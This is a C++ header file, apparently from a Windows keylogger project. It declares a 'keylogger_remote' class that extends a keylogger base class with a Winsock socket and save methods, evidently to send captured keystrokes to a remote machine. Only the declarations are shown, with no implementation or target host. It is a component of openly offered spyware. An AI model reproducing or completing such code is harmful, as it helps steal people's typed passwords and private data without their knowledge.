#ifndef KEYLOGGER_REMOTE_HPP_
#define KEYLOGGER_REMOTE_HPP_

#include "../keylogger.hpp"

#include <winsock2.h>

using namespace std;

class keylogger_remote : virtual public keylogger
{
    private:
		SOCKET a_socket;

    public:
		keylogger_remote();

		virtual ~keylogger_remote();

		virtual void initialize();

		virtual void save(int);

		virtual void save(LPCSTR);
};

#endif
